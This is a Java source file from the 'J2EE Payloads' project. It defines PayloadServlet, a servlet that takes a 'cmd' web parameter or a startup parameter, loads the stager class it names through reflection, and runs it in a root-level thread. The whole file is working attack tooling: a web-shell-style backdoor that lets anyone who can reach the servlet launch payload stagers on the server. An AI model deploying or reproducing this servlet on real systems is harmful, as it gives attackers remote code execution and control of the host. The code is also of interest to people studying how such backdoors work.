/*
 * J2EE Payloads.
 * 
 * Copyright (c) 2010, Michael 'mihi' Schierl
 * All rights reserved.
 * 
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 
 * - Redistributions of source code must retain the above copyright notice,
 *   this list of conditions and the following disclaimer.
 *   
 * - Redistributions in binary form must reproduce the above copyright
 *   notice, this list of conditions and the following disclaimer in the
 *   documentation and/or other materials provided with the distribution.
 *   
 * - Neither name of the copyright holders nor the names of its
 *   contributors may be used to endorse or promote products derived from
 *   this software without specific prior written permission.
 *   
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND THE CONTRIBUTORS
 * "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
 * LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
 * A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT
 * HOLDERS OR THE CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT,
 * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING,
 * BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS
 * OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
 * ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE
 * USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

package j2eepayload.servlet;

import java.io.IOException;

import javapayload.stager.Stager;

import javax.servlet.ServletException;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

public class PayloadServlet extends HttpServlet {
	
	private static final long serialVersionUID = 1L;

	public void init() throws ServletException {
		super.init();
		String startup = getInitParameter("startup"); 
		if (startup != null) {
			execPayload(startup);
		}
	}
	
	protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
		String cmd = request.getParameter("cmd");
		if (cmd == null) {
			response.getWriter().write("<h1>JavaPayload Servlet</h1><form action=\"#\"><input type=\"text\"name=\"cmd\" width=\"100\"></form>");
		} else {
			Exception ex = execPayload(cmd);
			if (ex == null) {
				response.getWriter().write("Payload started.");
			} else {
				throw new RuntimeException("Could not start payload", ex);
			}
		}
	}
	
	private Exception execPayload(String cmd) {
		final String[] args = cmd.split(" ");
		ThreadGroup tg = Thread.currentThread().getThreadGroup();
		while (tg.getParent() != null)
			tg = tg.getParent();
		PayloadRunner runner = new PayloadRunner(tg, args);
		ClassLoader cl = runner.getContextClassLoader();
		while (cl.getParent() != null)
			cl = cl.getParent();
		runner.setContextClassLoader(cl);
		runner.start();
		try {
			runner.join(1000);
		} catch (InterruptedException ex) {
		}
		return runner.getException();
	}

	public static class PayloadRunner extends Thread {
		private final String[] args;
		private Exception exception;

		private PayloadRunner(ThreadGroup tg, String[] args) {
			super(tg, (Runnable) null);
			this.args = args;
		}

		public void run() {
			try {
				final Stager stager = (Stager) Class.forName("javapayload.stager." + args[0]).newInstance();
				stager.bootstrap(args);
			} catch (Exception ex) {
				exception = ex;
			}
		}
		
		public Exception getException() {
			return exception;
		}
	}
}
